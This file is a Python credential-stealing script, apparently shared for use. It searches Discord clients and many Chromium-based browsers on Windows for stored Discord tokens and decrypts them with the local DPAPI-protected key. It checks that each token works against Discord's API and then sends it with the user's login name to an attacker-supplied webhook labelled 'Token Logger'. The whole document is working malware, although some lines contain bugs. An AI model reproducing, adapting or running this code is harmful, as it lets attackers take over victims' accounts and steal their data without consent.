import os
import requests
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import listdir
from json import loads
from re import findall

tokens = []
cleaned = []
checker = []
name = os.getlogin() 

webhook = "your webhook url"

def decrypt(buff, master_key):
        try:
            return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return "Error"

already_check = []
checker = []
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
chrome = local + "\\Google\\Chrome\\User Data"
paths = {
    'Discord': roaming + '\\discord',
    'Discord Canary': roaming + '\\discordcanary',
    'Lightcord': roaming + '\\Lightcord',
    'Discord PTB': roaming + '\\discordptb',
    'Opera': roaming + '\\Opera Software\\Opera Stable',
    'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
    'Amigo': local + '\\Amigo\\User Data',
    'Torch': local + '\\Torch\\User Data',
    'Kometa': local + '\\Kometa\\User Data',
    'Orbitum': local + '\\Orbitum\\User Data',
    'CentBrowser': local + '\\CentBrowser\\User Data',
    '7Star': local + '\\7Star\\7Star\\User Data',
    'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
    'Chrome': chrome + 'Default',
    'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': local + '\\Iridium\\User Data\\Default'
}

for platform, path in paths.items():
    if not os.path.exists(path): continue
    try:
        with open(path + f"\\Local State", "r") as file:
            key = loads(file.read())['os_crypt']['encrypted_key']
            file.close()
    except: continue
    for file in listdir(path + f"\\Local Storage\\leveldb\\"):
        if not file.endswith(".ldb") and file.endswith(".log"): continue
        else:
            try:
                with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                    for x in files.readlines():
                        x.strip()
                        for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                            tokens.append(values)
            except PermissionError: continue
    for i in tokens:
        if i.endswith("\\"):
            i.replace("\\", "")
        elif i not in cleaned:
            cleaned.append(i)
    for token in cleaned:
        try:
            tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
        except IndexError == "Error": continue
        checker.append(tok)
        for value in checker:
            if value not in already_check:
                already_check.append(value)
                headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                try:
                    res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                except: continue
                if res.status_code == 200:
                    msg = {
                        "username" : "Token Logger"
                    }

                    msg["embeds"] = [
                        {
                            "description" : tok,
                            "title" : name + "'s token:"
                        }
                    ]

                    posted = requests.post(webhook, json = msg)

                    try:
                        posted.raise_for_status()
                    except requests.exceptions.HTTPerroror as error:
                        print(error)